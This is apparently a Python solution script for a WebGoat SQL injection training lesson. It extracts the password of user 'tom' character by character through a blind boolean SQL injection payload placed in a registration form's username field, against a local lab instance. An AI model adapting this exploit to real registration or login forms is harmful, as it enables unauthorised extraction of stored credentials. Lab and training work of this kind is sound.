import json  
import requests  
  
def sql_injection_advance_5():  
        alphabet_index = 0  
        alphabet = 'abcdefghijklmnopqrstuvwxyz'  
        password_index = 0  
        password = ''  

        headers = {  
        'Cookie': COOKIE,  
        }  

        while True:  

                payload = f'tom\' AND substring(password,{password_index + 1},1)=\'{alphabet[alphabet_index]}'

                data = {  
                'username_reg': payload,  
                'email_reg': '1@1',  
                'password_reg': '1',  
                'confirm_password_reg': '1'  
                }  

                r = requests.put('http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge', headers=headers, data=data)  
                r = requests.put('http://localhost:8080/WebGoat/start.mvc#lesson/SqlInjectionAdvanced.lesson/4', headers=headers, data=data)  


                try:  
                        response = json.loads(r.text)  
                except:  
                        print("Wrong JSESSIONID, find it by looking at your requests once logged in.")  
                        return  

                if "already exists please try to register with a different username" not in response['feedback']:  
                        alphabet_index += 1  
                        if alphabet_index > len(alphabet) - 1:  
                                return  
                else:  
                        password += alphabet[alphabet_index]  
                        print(password)  
                        alphabet_index = 0  
                        password_index += 1  
  
sql_injection_advance_5()